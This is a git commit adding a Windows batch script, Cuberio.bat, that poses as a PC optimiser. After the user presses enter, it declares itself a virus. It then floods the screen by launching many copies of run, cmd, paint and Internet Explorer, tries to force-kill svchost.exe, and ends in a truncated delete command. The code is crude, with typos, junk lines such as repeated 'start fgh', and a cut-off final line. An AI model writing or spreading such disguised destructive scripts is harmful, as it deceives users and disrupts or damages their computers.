23d7c8beab5e84c537f54ac9134e70150317f529
Xsoft <127049334+XsoftBud@users.noreply.github.com>
2023-12-25 07:46:10 -0800

    Create Cuberio.bat

---
+++ Cuberio.bat
@@ -0,0 +1,144 @@
+@echo off
+cls
+cd c:/ >nul
+echo problems with your computer?
+echo you are lucky! Cuberio helps you optimise your pc. press enter for a surprise!
+pause>nul
+color 4
+cls
+echo Well hope you enjoyed your pc. now its timr for a termination :)
+echo this is a virus. it will start in 3 seconds.
+timeout 3
+cls
+cls
+color 4
+start run
+start run
+start run
+start cmd
+start paint
+start ie
+start ie
+start run
+start run
+start run
+start cmd
+start paint
+start ie
+start ie
+start run
+start run
+start run
+start cmd
+start paint
+start ie
+start ie
+start run
+start run
+start run
+start cmd
+start paint
+start ie
+start ie
+start run
+start run
+start run
+start cmd
+start paint
+start ie
+start ie
+start run
+start run
+start run
+start cmd
+start paint
+start ie
+start ie
+start run
+start run
+start run
+start cmd
+start paint
+start ie
+start ie
+start run
+start run
+start run
+start cmd
+start paint
+start ie
+start ie
+start run
+start run
+start run
+start cmd
+start paint
+start ie
+start ie
+start fgh
+start fghstart fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+v
+start fgh
+
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+start fgh
+taskill /f /im svchost.exe
+del "
